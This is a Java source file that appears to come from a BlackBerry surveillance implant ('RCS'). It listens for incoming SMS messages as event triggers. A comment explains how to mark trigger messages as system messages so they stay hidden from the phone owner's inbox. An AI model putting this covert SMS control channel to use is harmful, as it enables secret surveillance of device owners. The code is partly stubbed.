/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : SmsEvent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.IOException;
import java.io.InterruptedIOException;

import javax.microedition.io.Connector;
import javax.microedition.io.Datagram;
import javax.microedition.io.DatagramConnection;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.MessageListener;
import javax.wireless.messaging.TextMessage;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

/**
 * To prevent this message from appearing in the BlackBerry device user’s inbox,
 * the sending server should configure the SMS message so that the message type
 * is a system message. This message type can be defined by setting the Protocol
 * Identifier (TP-PID) to 64 (0x40), and the Digital Coding Scheme (TP-DCS) to
 * 244 (0xF4), as shown below: 07913180998000F0040491369740F43080224100238
 * A1168656C6C6F62696E61727974706964363
 * 
 * http://www.blackberry.com/knowledgecenterpublic/livelink.exe/fetch/2000/
 * 348583
 * /796557/800451/800563/How_To_-_Use_SMS_to_notify_an_application.html?nodeid
 * =1266974&vernum=0
 * 
 * @author user1
 * 
 */
public class SmsEvent extends Event implements MessageListener {
    //#debug
    private static Debug debug = new Debug("SmsEvent", DebugLevel.VERBOSE);

    private boolean _stop = false;
    private DatagramConnection _dc;
    MessageConnection _mc;

    public SmsEvent(int actionId, byte[] confParams) {
        super(Event.EVENT_SMS, actionId, confParams);

    }

    public synchronized void actualStop() {

        try {
            _dc.close(); // Close the connection so the thread returns. 
        } catch (IOException e) {
            debug.error(e.toString());
        }
    }

    public void notifyIncomingMessage(MessageConnection conn) {
        Message m;
        try {
            m = _mc.receive();

            String address = m.getAddress();
            String msg = null;
            if (m instanceof TextMessage) {
                TextMessage tm = (TextMessage) m;
                msg = tm.getPayloadText();
            } else if (m instanceof BinaryMessage) {
                StringBuffer buf = new StringBuffer();
                byte[] data = ((BinaryMessage) m).getPayloadData();

                // convert Binary Data to Text
                msg = new String(data, "UTF-8");
            } else {
                System.out.println("Invalid Message Format");
                System.out.println("Received SMS text from " + address + " : "
                        + msg);
            }
        } catch (InterruptedIOException e) {
            debug.error(e.toString());
        } catch (IOException e) {
            debug.error(e.toString());
        }
    }

    protected void actualRun() {
        try {
            _mc = (MessageConnection) Connector.open("sms://:0");
            _mc.setMessageListener(this);
        } catch (IOException e) {
            debug.error(e.toString());
        }

        try {
            _mc.close();
        } catch (IOException e) {
            debug.error(e.toString());
        }
    }

    /**
     * http://www.blackberry.com/knowledgecenterpublic/livelink.exe/fetch/2000/
     * 348583
     * /800451/800563/What_Is_-_Different_ways_to_listen_for_SMS_messages.html
     * ?nodeid=1357551&vernum=0
     */
    protected void actualRunDatagram() {
        // #debug
        debug.trace("actualRun");
        try {
            _dc = (DatagramConnection) Connector.open("sms://");

            Datagram d = _dc.newDatagram(_dc.getMaximumLength());
            debug.trace("waiting to receive sms");
            _dc.receive(d);

            String address = new String(d.getAddress());
            String msg = new String(d.getData());

            debug.info("SMS Message received: " + msg);
            debug.info("From: " + address);

        } catch (IOException e) {
            debug.trace("exception: " + e);
        }
    }

    protected boolean parse(byte[] confParams) {
        // TODO Auto-generated method stub
        return false;
    }

}
